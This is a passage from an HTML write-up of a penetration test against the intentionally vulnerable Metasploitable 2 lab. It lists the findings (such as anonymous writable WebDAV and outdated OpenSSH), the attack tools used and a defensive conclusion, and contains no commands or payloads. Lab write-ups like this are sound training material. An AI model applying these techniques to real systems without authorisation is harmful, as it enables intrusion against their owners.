          <li>‚úì WebDAV writable directory with anonymous access</li>
          <li>‚úì OpenSSH 4.7p1 (outdated)</li>
          <li>‚úì MySQL/PostgreSQL exposed</li>
          <li>‚úì NFS shares available</li>
          <li>‚úì VNC service on port 5900</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Tools Used -->
  <div class="step">
    <h3>üõ†Ô∏è Tools Used</h3>
    <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem;">
      <span class="tag">Nmap 7.98</span>
      <span class="tag">Metasploit 6.4</span>
      <span class="tag">Searchsploit</span>
      <span class="tag">DAVTest</span>
      <span class="tag">Cadaver</span>
      <span class="tag">Telnet</span>
      <span class="tag">cURL</span>
      <span class="tag">Netcat</span>
    </div>
  </div>

  <!-- Conclusion -->
  <div class="step">
    <h3>üìù Conclusion</h3>
    <p>This comprehensive penetration test of Metasploitable 2 successfully demonstrated multiple critical security failures that lead to complete system compromise. The exercise highlighted how default credentials, unpatched services, and misconfigured permissions (especially WebDAV with anonymous write access) can create catastrophic security vulnerabilities.</p>
    
    <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
      <p><strong>‚ö†Ô∏è Critical Takeaway:</strong> Default credentials, outdated software versions, and misconfigured web services (WebDAV with write permissions) remain the most common entry points for attackers. Organizations must implement defense-in-depth strategies including regular patching, strong password policies, and proper access controls.</p>
    </div>
    
    <p style="margin-top: 1rem; font-size: 0.9rem; color: #9ca3af;">
      <em>This assessment was conducted for educational purposes in a controlled lab environment. Metasploitable 2 is intentionally vulnerable for security training. The techniques demonstrated should only be used on systems you own or have explicit permission to test.</em>
    </p>
  </div>
</div>